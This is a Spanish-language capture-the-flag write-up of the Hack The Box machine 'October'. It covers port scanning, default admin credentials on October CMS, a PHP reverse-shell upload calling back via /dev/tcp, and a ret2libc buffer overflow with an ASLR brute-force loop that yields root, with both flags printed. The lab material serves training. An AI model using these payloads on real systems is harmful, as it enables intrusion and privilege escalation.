---
layout: post
title: October
date: 2023-03-05
description:
img:
fig-caption:
tags: [eWPT (Intrusión)]
---
___

<center><img src="/writeups/assets/img/October-htb/October.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Buffer Overflow (Ret2libc) - Bypass ASLR (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.16 -oG openports -vvv
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 08:58 GMT
Initiating SYN Stealth Scan at 08:58
Scanning 10.10.10.16 [65535 ports]
Discovered open port 22/tcp on 10.10.10.16
Discovered open port 80/tcp on 10.10.10.16
Completed SYN Stealth Scan at 08:58, 27.62s elapsed (65535 total ports)
Nmap scan report for 10.10.10.16
Host is up, received user-set (0.24s latency).
Scanned at 2023-03-05 08:58:14 GMT for 27s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.76 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 22 (968B)
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.10.16 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 08:59 GMT
Nmap scan report for 10.10.10.16
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 79b135b6d12512a30cb52e369c332628 (DSA)
|   2048 16086851d17b075a34660d4cd02556f5 (RSA)
|   256 e397a7922372bf1d098885b66c174e85 (ECDSA)
|_  256 8985909820bf035d357f4aa9e11b6531 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-methods: 
|_  Potentially risky methods: PUT PATCH DELETE
|_http-title: October CMS - Vanilla
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds

```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.16
http://10.10.10.16 [200 OK] Apache[2.4.7], Cookies[october_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], HttpOnly[october_session], IP[10.10.10.16], Meta-Author[October CMS], PHP[5.5.9-1ubuntu4.21], Script, Title[October CMS - Vanilla], X-Powered-By[PHP/5.5.9-1ubuntu4.21]
```

La página principal se ve así:

<img src="/writeups/assets/img/October-htb/1.png" alt="">

Este CMS tiene contempladas varias vulnerabilidades

```null
searchsploit october
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
October CMS - Upload Protection Bypass Code Execution (Metasploit)                                                                                                            | php/remote/47376.rb
October CMS 1.0.412 - Multiple Vulnerabilities                                                                                                                                | php/webapps/41936.txt
October CMS < 1.0.431 - Cross-Site Scripting                                                                                                                                  | php/webapps/44144.txt
October CMS Build 465 - Arbitrary File Read Exploit (Authenticated)                                                                                                           | php/webapps/49045.sh
October CMS User Plugin 1.4.5 - Persistent Cross-Site Scripting                                                                                                               | php/webapps/44546.txt
OctoberCMS 1.0.425 (Build 425) - Cross-Site Scripting                                                                                                                         | php/webapps/42978.txt
OctoberCMS 1.0.426 (Build 426) - Cross-Site Request Forgery                                                                                                                   | php/webapps/43106.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Me puedo registrar

<img src="/writeups/assets/img/October-htb/2.png" alt="">

Inspecciono el código del primer exploit

```null
searchsploit -x php/remote/47376.rb | cat -l rb
```

La ruta ```/backend``` existe en la web

<img src="/writeups/assets/img/October-htb/3.png" alt="">

Las credenciales por defecto ```admin:admin``` son válidas

<img src="/writeups/assets/img/October-htb/4.png" alt="">

Intento crear un archivo en PHP, pero me dice que la extensión no es válida

<img src="/writeups/assets/img/October-htb/5.png" alt="">

Otra forma es subiendo el archivo directamente en ```media```

```null
<?php
    system("bash -c 'bash -i >& /dev/tcp/10.10.16.9/443 0>&1'");
?>
```

<img src="/writeups/assets/img/October-htb/6.png" alt="">

Al abrirlo gano acceso como ```www-data```

<img src="/writeups/assets/img/October-htb/7.png" alt="">

Puedo ver la primera flag

```null
www-data@october:/home/harry$ cat user.txt 
f14ed5493c4f6f7201bb5ef181eeef3e
```

# Escalada

Listo todos los binarios SUID a los que tengo acceso

```null
www-data@october:/$ find \-perm \-4000 2>/dev/null 
./bin/umount
./bin/ping
./bin/fusermount
./bin/su
./bin/ping6
./bin/mount
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/pkexec
./usr/bin/passwd
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/traceroute6.iputils
./usr/bin/mtr
./usr/bin/chsh
./usr/bin/at
./usr/sbin/pppd
./usr/sbin/uuidd
./usr/local/bin/ovrflw
```

El último es inusual. Me lo transfiero a mi equipo

```null
file binary
binary: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=004cdf754281f7f7a05452ea6eaf1ee9014f07da, not stripped
```

Lo abro con Ghidra para analizarlo

<img src="/writeups/assets/img/October-htb/8.png" alt="">

Se está empleando una función que se considera vulnerable a Buffer Overflow. Al pasarle como argumento muchas ```"A"```, el programa se corrompe

```null
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0xf7e1cff4  →  0x0021cd8c
$ecx   : 0xffffdad0  →  "AAAAA"
$edx   : 0xffffd802  →  "AAAAA"
$esp   : 0xffffd740  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x80484d0  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x41414141 ("AAAA"?)
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd740│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	← $esp
0xffffd744│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd748│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd74c│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd750│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd754│+0x0014: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd758│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd75c│+0x001c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "binary", stopped 0x41414141 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Cuenta con Data Execution Prevention. No va a interpretar shellcode en la pila, pero puedo tratar de efectuar un ```ret2libc```

```null
checksec binary
[*] '/home/rubbx/Desktop/HTB/Machines/October/binary'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Creo un patrón y calculo el offset

```null
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
[+] Saved as '$_gef0'
```

```null
gef➤  pattern offset $eip
[+] Searching for '$eip'
[+] Found at offset 112 (little-endian search) likely
[+] Found at offset 304 (big-endian search) 
```

Compruebo que es correcto

```null
python3 -c 'print("A"*112+"B"*4+"C"*100)' | xclip -sel clip
```

```null
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0xf7e1cff4  →  0x0021cd8c
$ecx   : 0xffffdad0  →  "CCCCC"
$edx   : 0xffffd7ff  →  "CCCCC"
$esp   : 0xffffd7a0  →  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x80484d0  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd7a0│+0x0000: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"	← $esp
0xffffd7a4│+0x0004: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd7a8│+0x0008: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd7ac│+0x000c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd7b0│+0x0010: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd7b4│+0x0014: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd7b8│+0x0018: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd7bc│+0x001c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "binary", stopped 0x42424242 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Para sacar las direcciones de ```system``` y ```exit``` utilizo ```readelf```

```null
readelf -s libc.so.6 | grep -E " system| exit"
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
```

Necesito encontrar en ```libc``` la cadena ```/bin/sh``` hardcodeada para ejecutarla y que se spawneé una shell

```null
www-data@october:/$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"  
 162bac /bin/sh
```

Con ```python3``` calculo las direcciones reales a partir de la dirección base de ```libc```

```null
python3
Python 3.11.5 (main, Aug 29 2023, 15:31:31) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0xb75f8000 + 0x33260) # exit
'0xb762b260'
>>> hex(0xb75f8000 + 0x40310) # system
'0xb7638310'
>>> hex(0xb75f8000 + 0x162bac) # /bin/sh
'0xb775abac'
```

El ASLR está habilitado, pero al tratarse de un binario de ```32bits``` es muy probable por estadística que se produzca una colisión en la dirección en base y se vuelva a dar el mismo caso

```null
www-data@october:/var/www/html/cms/storage/app/media$ cat /proc/sys/kernel/randomize_va_space 
2
```

Tengo que introducir las cadenas con las direcciones de ```system```, ```exit``` y ```/bin/sh```, respectivamente, después del offset, donde estarán los ```NOPs```. Tienen que estar en formato ```Big Endian```. Al primer intento, como ya expliqué, lo más probable es que no funcione

```null
www-data@october:/$ ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"');
Segmentation fault (core dumped)
```

Pero con un bucle infinito acabo convirtiéndome en ```root```

```null
ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'); done
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Trace/breakpoint trap (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
[...snip...]

# whoami
root
# cat /root/root.txt
f7cd1fed74e6d9685911bedb2450f675
```